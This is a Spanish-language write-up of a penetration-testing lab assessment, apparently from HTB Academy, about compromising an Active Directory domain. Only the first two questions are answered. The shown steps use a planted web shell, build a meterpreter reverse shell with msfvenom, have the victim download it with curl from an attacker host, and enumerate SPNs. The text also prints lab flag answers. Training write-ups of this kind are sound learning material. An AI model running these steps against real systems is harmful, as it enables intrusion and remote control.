## Escenario

Un miembro del equipo comenzó una Prueba de Penetración Externa y fue trasladado a otro proyecto urgente antes de poder terminar. El miembro del equipo logró encontrar y explotar una vulnerabilidad de subida de archivos después de realizar reconocimiento del servidor web expuesto externamente. Antes de cambiar de proyecto, nuestro compañero dejó una web shell protegida por contraseña (con las credenciales: `admin:My_W3bsH3ll_P@ssw0rd!`) en su lugar para que nosotros comencemos en el directorio `/uploads`. Como parte de esta evaluación, nuestro cliente, Inlanefreight, nos ha autorizado a ver hasta dónde podemos llevar nuestro punto de apoyo y está interesado en ver qué tipos de problemas de alto riesgo existen dentro del entorno AD. Aprovecha la web shell para obtener un punto de apoyo inicial en la red interna. Enumera el entorno de Active Directory buscando fallas y configuraciones incorrectas para moverte lateralmente y finalmente lograr el compromiso del dominio.

Aplica lo aprendido en este módulo para comprometer el dominio y responde las preguntas a continuación para completar la parte I de la evaluación de habilidades.

**Preguntas:**
##### 1. _Sube los contenidos del archivo flag.txt en el Escritorio del administrador del servidor web_

Nos tomaremos este laboratorio como si de una máquina se tratara. Por ello, comenzamos con la enumeración de puertos:

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.202.242
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-13 01:24 CET
Nmap scan report for 10.129.202.242
Host is up (0.11s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
..SNIP...
```

El puerto 80 se encuentra abierto, por lo que navegamos mediante `http` a `http://10.129.202.242/uploads/antak.aspx`, que es donde ya se encuentra la shell. Iniciamos sesión con las credenciales provistas. Simplemente ejecutamos el comando de lectura de la flag:

```powershell
type C:\Users\Administrator\Desktop\flag.txt
```

> **Respuesta**: JusT_g3tt1ng_st@rt3d!
##### 2. _Realiza Kerberoast a una cuenta con el SPN MSSQLSvc/SQL01.inlanefreight.local:1433 y envía el nombre de la cuenta como respuesta_

Esta shell supone un absoluto tostón. Cambiemos a una reverse shell. Lo primero es identificar el tipo de sistema de la máquina víctima. 

![[Pasted image 20251213013414.png]]

Vale, sabemos que es x64. Por tanto, en este punto, para mayor comodidad y gracias a que Antax nos permite subir archivos, generaremos con `msfvenom` una revershe shell con este tipo de payload:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.165 LPORT=443 -f exe -o revmeter.exe
```

Iniciamos el listener con Metasploit para obtener directamente una sesión con Meterpreter:

```bash
$ msfconsole
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.165
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.165:443 
```

Para poder subir el archivo desde la shell de Antax, tendremos que preparar un servidor local en Python. Por tanto, en nuestra máquina Kali:

```bash
python -m http.server 8000
```

Y en la shell de Antax:

```powershell
curl http://10.10.14.165:8000/revmeter.exe -O C:\Windows\System32\payload.exe
```

Nos avisará el servidor: `10.129.202.242 - - [13/Dec/2025 01:41:43] "GET /revmeter.exe HTTP/1.1" 200 -`. En este punto simplemente ejecutamos el payload y obtendremos la sesión. Ahora que tenemos la sesión válida, obtenemos del dominio INLANEFREIGHT.LOCAL los _Service Principal Names_ (SPNs). 

```powershell
setspn -T INLANEFREIGHT.LOCAL -Q */*
```

![[Pasted image 20251213015416.png]]

> **Respuesta**: svc_sql
##### 3. _Crackea la contraseña de la cuenta. Envía el valor en texto claro._


##### 4. _Envía el contenido del archivo flag.txt en el escritorio del Administrator en MS01_


##### 5. _Encuentra credenciales en texto claro de otro usuario del dominio. Envía el nombre de usuario como respuesta._


##### 6. _Envía la contraseña en texto claro de este usuario._


##### 7. _¿Qué ataque puede realizar este usuario?_


##### 8. _Toma el control del dominio y envía el contenido del archivo flag.txt en el escritorio del Administrator en DC01_

